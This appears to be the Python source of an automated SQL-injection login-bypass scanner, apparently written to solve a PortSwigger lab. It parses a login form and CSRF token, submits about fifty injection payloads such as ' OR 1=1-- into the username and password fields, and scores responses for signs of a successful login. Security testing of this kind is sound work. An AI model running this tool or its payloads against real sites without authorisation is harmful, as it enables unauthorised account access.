"""
===========================================================
Project : Sentinel AI
Module  : Login Bypass Scanner
File ID : SCANNER-LOGIN-002
Version : 2.0.0
===========================================================

Description:
Professional login bypass scanner using core components.
- FormParser for HTML parsing
- SessionManager for session/cookie management
- PayloadInjector for payload injection
- ResponseAnalyzer for success detection

PortSwigger Lab #2:
SQL injection vulnerability allowing login bypass

Architecture:
1. GET /login → FormParser → CSRF + Form Fields
2. SessionManager → Maintain session
3. PayloadInjector → Inject payloads into username/password
4. ResponseAnalyzer → Check success signals
5. Generate finding with evidence
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any

from app.modules.scanner.core.base_scanner import BaseScanner
from app.modules.scanner.core.form_parser import FormParser, ParsedForm
from app.modules.scanner.core.session_manager import SessionManager
from app.modules.scanner.core.payload_injector import PayloadInjector


@dataclass
class LoginBypassFinding:
    """Login bypass finding."""

    vulnerable: bool = False
    url: str = ""
    username_payload: str = ""
    password_payload: str = ""
    csrf_token: str = ""
    technique: str = "Login Bypass"
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    success_signals: List[str] = field(default_factory=list)
    request_details: Dict[str, Any] = field(default_factory=dict)


class LoginBypassScanner(BaseScanner):
    """
    Login bypass scanner using core components.
    Pure orchestration — no parsing or session logic.
    """

    def __init__(self, target: str):
        super().__init__(target)
        self.findings: List[LoginBypassFinding] = []
        self.form_parser = FormParser()
        self.session_manager = SessionManager()
        self.payload_injector = PayloadInjector(target)

        self.csrf_token: Optional[str] = None
        self.csrf_field: Optional[str] = None
        self.login_url: str = target
        self._login_form: Optional[ParsedForm] = None

        # Scanner configuration
        self.max_payloads: int = 50
        self.stop_on_first: bool = True

        # Statistics (required by BaseScanner)
        self.statistics = {
            "requests": 0,
            "responses": 0,
            "errors": 0,
            "findings": 0,
            "vulnerabilities": 0,
        }

        # Runtime tracking
        self.started_at: Optional[float] = None
        self.finished_at: Optional[float] = None

    def scan(self) -> List[LoginBypassFinding]:
        """
        Execute complete login bypass scan.

        Returns:
            List of LoginBypassFinding objects
        """
        self.findings.clear()
        self.started_at = self._now()

        # ============================================================
        # Step 1: Fetch login page
        # ============================================================
        self._log("Step 1: Fetching login page...")
        login_response = self._fetch_login_page()

        if login_response is None:
            self._log("❌ Login page not accessible")
            self.finished_at = self._now()
            return self.findings

        self._log(f"✅ Login page fetched (status: {login_response.status_code})")

        # ============================================================
        # Step 2: Parse forms and extract CSRF
        # ============================================================
        self._log("Step 2: Parsing forms...")
        forms = self.form_parser.parse(login_response.body, self.login_url)

        if not forms:
            self._log("⚠️ No forms found on login page")
            self.finished_at = self._now()
            return self.findings

        self._login_form = forms[0]  # Usually first form is login
        self.csrf_token = self._login_form.csrf_token
        self.csrf_field = self._login_form.csrf_field_name

        # Update login URL with form action
        if self._login_form.action_url:
            self.login_url = self._login_form.action_url

        self._log(
            f"✅ CSRF token: {self.csrf_token[:20] if self.csrf_token else 'None'}..."
        )
        self._log(f"✅ CSRF field: {self.csrf_field}")
        self._log(f"✅ Login action URL: {self.login_url}")

        # ============================================================
        # Step 3: Test payloads
        # ============================================================
        self._log("Step 3: Testing login bypass payloads...")
        payloads = self._get_login_payloads()

        for idx, (username, password) in enumerate(payloads):
            if self.max_payloads and idx >= self.max_payloads:
                break

            self._log(f"  Testing payload {idx + 1}/{len(payloads)}...")

            result = self._test_payload(username, password)

            if result:
                self.findings.append(result)
                self._log(f"✅ Vulnerable! Username: {username}")

                if self.stop_on_first:
                    break

        # ============================================================
        # Step 4: Merge duplicate findings
        # ============================================================
        self.findings = self._merge_findings(self.findings)

        # ============================================================
        # Step 5: Update statistics
        # ============================================================
        self.finished_at = self._now()
        self._update_statistics()

        self._log(f"✅ Scan complete. Findings: {len(self.findings)}")
        return self.findings

    # ============================================================
    # Core Methods
    # ============================================================

    def _fetch_login_page(self):
        """Fetch login page and update session."""
        try:
            response = self.request.send(
                method="GET",
                url=self.login_url,
            )

            if response:
                self.session_manager.update_from_response(response)
                self._update_requests_sent()

            return response

        except Exception as e:
            self._log(f"❌ Failed to fetch login page: {e}")
            self._update_errors()
            return None

    def _test_payload(
        self, username: str, password: str
    ) -> Optional[LoginBypassFinding]:
        """
        Test a single login payload.

        Args:
            username: Username payload
            password: Password payload

        Returns:
            LoginBypassFinding or None
        """
        if self._login_form is None:
            return None

        # ============================================================
        # Step 1: Build form data with payload injection
        # ============================================================
        form_data = self.form_parser.extract_form_data(
            self._login_form, {"username": username, "password": password}
        )

        # ============================================================
        # Step 2: Inject payloads into username/password fields
        # ============================================================
        if self._login_form.username_field:
            form_data = self.payload_injector.inject_form_field(
                form_data, self._login_form.username_field, username, "replace"
            )

        if self._login_form.password_field:
            form_data = self.payload_injector.inject_form_field(
                form_data, self._login_form.password_field, password, "replace"
            )

        # ============================================================
        # Step 3: Send POST request with session
        # ============================================================
        try:
            response = self.request.send(
                method="POST",
                url=self.login_url,
                data=form_data,
                cookies=self.session_manager.get_cookies(),
            )

            if response is None:
                return None

            self._update_requests_sent()

            # Update session from response
            self.session_manager.update_from_response(response)

            # ============================================================
            # Step 4: Analyze response
            # ============================================================
            success, signals, confidence = self._analyze_response(response)

            if success:
                finding = LoginBypassFinding(
                    vulnerable=True,
                    url=self.login_url,
                    username_payload=username,
                    password_payload=password,
                    csrf_token=self.csrf_token or "",
                    technique="Login Bypass",
                    confidence=confidence,
                    success_signals=signals,
                    request_details={
                        "method": "POST",
                        "url": self.login_url,
                        "status_code": response.status_code,
                        "cookies": self.session_manager.get_cookies(),
                    },
                    evidence=[
                        f"Username payload: {username}",
                        f"Password payload: {password}",
                        f"CSRF token: {self.csrf_token[:20] if self.csrf_token else 'None'}...",
                        f"Success signals: {', '.join(signals)}",
                        f"Response status: {response.status_code}",
                    ],
                )
                return finding

            return None

        except Exception as e:
            self._log(f"❌ Test failed for {username}: {e}")
            self._update_errors()
            return None

    # ============================================================
    # Response Analysis
    # ============================================================

    def _analyze_response(self, response) -> tuple[bool, List[str], float]:
        """
        Analyze login response for success signals.

        Args:
            response: HTTP response

        Returns:
            Tuple of (success, signals, confidence)
        """
        signals = []
        confidence = 0.0

        if response is None:
            return False, signals, 0.0

        body = response.body.lower()

        # ============================================================
        # Signal 1: Redirect (302, 303, 307)
        # ============================================================
        if response.status_code in [301, 302, 303, 307, 308]:
            signals.append("Redirect")
            confidence += 0.25

        # ============================================================
        # Signal 2: Session cookie (authentication)
        # ============================================================
        if self.session_manager.is_authenticated():
            signals.append("Session cookie")
            confidence += 0.30

        # ============================================================
        # Signal 3: Logout/account keywords
        # ============================================================
        success_keywords = [
            "logout",
            "log out",
            "sign out",
            "signout",
            "my account",
            "my-account",
            "profile",
            "dashboard",
            "welcome",
            "welcome back",
            "administrator",
            "admin panel",
            "logged in",
        ]

        for keyword in success_keywords:
            if keyword in body:
                signals.append(f"Keyword: {keyword}")
                confidence += 0.20
                break

        # ============================================================
        # Signal 4: No error message
        # ============================================================
        error_keywords = [
            "invalid",
            "incorrect",
            "wrong",
            "error",
            "failed",
            "try again",
            "invalid username",
            "invalid password",
            "incorrect password",
            "login failed",
        ]

        has_error = any(keyword in body for keyword in error_keywords)

        if not has_error and len(signals) > 0:
            signals.append("No error message")
            confidence += 0.15

        # ============================================================
        # Confidence threshold
        # ============================================================
        confidence = min(confidence, 1.0)

        # Success if confidence >= 0.5 and at least 2 signals
        success = confidence >= 0.5 and len(signals) >= 2

        return success, signals, confidence

    # ============================================================
    # Payload Management
    # ============================================================

    def _get_login_payloads(self) -> List[tuple[str, str]]:
        """
        Return 50+ login bypass payloads.

        Returns:
            List of (username_payload, password_payload) tuples
        """
        payloads = []

        # ============================================================
        # Basic SQLi payloads (10)
        # ============================================================
        basic = [
            ("' OR 1=1--", "anything"),
            ("' OR '1'='1", "anything"),
            ("' OR 1=1#", "anything"),
            ("admin'--", "anything"),
            ("admin' OR 1=1--", "anything"),
            ("' UNION SELECT 'admin'--", "anything"),
            ("') OR ('1'='1", "anything"),
            ("' OR 1=1-- -", "anything"),
            ("' OR 1=1/*", "anything"),
            ("' OR 1=1--+", "anything"),
        ]
        payloads.extend(basic)

        # ============================================================
        # Admin password variants (5)
        # ============================================================
        admin = [
            ("admin", "admin'--"),
            ("admin", "' OR 1=1--"),
            ("admin", "' OR '1'='1"),
            ("admin", "admin' OR '1'='1"),
            ("admin", "' OR 1=1#"),
        ]
        payloads.extend(admin)

        # ============================================================
        # Username variants (8)
        # ============================================================
        username_variants = [
            ("admin'--", "password"),
            ("admin#", "password"),
            ("admin/*", "password"),
            ("' OR 1=1--", "password"),
            ("' OR '1'='1", "password"),
            ("' OR 1=1#", "password"),
            ("admin' OR 1=1--", "password"),
            ("admin'--", "password"),
        ]
        payloads.extend(username_variants)

        # ============================================================
        # API / Advanced variants (10)
        # ============================================================
        api_variants = [
            ("' OR 1=1-- -", "' OR 1=1-- -"),
            ("' OR '1'='1' --", "' OR '1'='1' --"),
            ("admin' OR '1'='1' --", "admin' OR '1'='1' --"),
            ("' OR 1=1 LIMIT 1--", "anything"),
            ("' OR 1=1 ORDER BY 1--", "anything"),
            ("' OR 1=1 UNION SELECT 1--", "anything"),
            ("' OR 'x'='x", "anything"),
            ("' OR 'x'='x'--", "anything"),
            ("' OR 'x'='x'#", "anything"),
            ("' OR 'x'='x'/*", "anything"),
        ]
        payloads.extend(api_variants)

        # ============================================================
        # Database-specific (7)
        # ============================================================
        db_specific = [
            # MySQL
            ("' OR 1=1-- -", "anything"),
            ("' OR 1=1 AND '1'='1'--", "anything"),
            # PostgreSQL
            ("' OR 1=1 OR '1'='1'--", "anything"),
            ("' OR 1=1 UNION SELECT NULL--", "anything"),
            # Oracle
            ("' OR 1=1--", "anything"),
            ("' OR '1'='1'--", "anything"),
            ("' OR 1=1 ORDER BY 1--", "anything"),
        ]
        payloads.extend(db_specific)

        # ============================================================
        # Comment variants (5)
        # ============================================================
        comment_variants = [
            ("' OR 1=1-- -", "anything"),
            ("' OR 1=1--+", "anything"),
            ("' OR 1=1/**/", "anything"),
            ("' OR 1=1; --", "anything"),
            ("' OR 1=1/*!*/", "anything"),
        ]
        payloads.extend(comment_variants)

        # ============================================================
        # No-space variants (5)
        # ============================================================
        no_space = [
            ("'OR'1'='1", "anything"),
            ("'OR'1'='1'--", "anything"),
            ("'OR'1'='1'#", "anything"),
            ("'OR1=1--", "anything"),
            ("'OR1=1#", "anything"),
        ]
        payloads.extend(no_space)

        return payloads

    # ============================================================
    # Helper Methods
    # ============================================================

    def _merge_findings(
        self, findings: List[LoginBypassFinding]
    ) -> List[LoginBypassFinding]:
        """
        Merge duplicate findings.

        Args:
            findings: List of findings

        Returns:
            Merged list of findings
        """
        if not findings:
            return []

        merged = {}
        for finding in findings:
            key = (finding.url, finding.username_payload)
            if key not in merged:
                merged[key] = finding
            else:
                # Keep the one with higher confidence
                if finding.confidence > merged[key].confidence:
                    merged[key] = finding

        return list(merged.values())

    def _update_statistics(self) -> None:
        """Update scanner statistics."""
        self.statistics["findings"] = len(self.findings)
        self.statistics["vulnerabilities"] = len(
            [f for f in self.findings if f.vulnerable]
        )

    def _update_requests_sent(self) -> None:
        """Update request counter."""
        self.statistics["requests"] = self.statistics.get("requests", 0) + 1

    def _update_errors(self) -> None:
        """Update error counter."""
        self.statistics["errors"] = self.statistics.get("errors", 0) + 1

    def _log(self, message: str) -> None:
        """Log a message with scanner prefix."""
        print(f"[LoginBypass] {message}")

    def _now(self) -> float:
        """Get current timestamp."""
        import time

        return time.time()


# ============================================================
# Unit Test
# ============================================================


def test_login_bypass():
    """Test LoginBypassScanner with a sample target."""
    scanner = LoginBypassScanner("https://example.com/login")
    findings = scanner.scan()

    print(f"\nFindings: {len(findings)}")
    for f in findings:
        print(f"  Username: {f.username_payload}")
        print(f"  Password: {f.password_payload}")
        print(f"  Confidence: {f.confidence}")
        print(f"  Signals: {f.success_signals}")


if __name__ == "__main__":
    test_login_bypass()
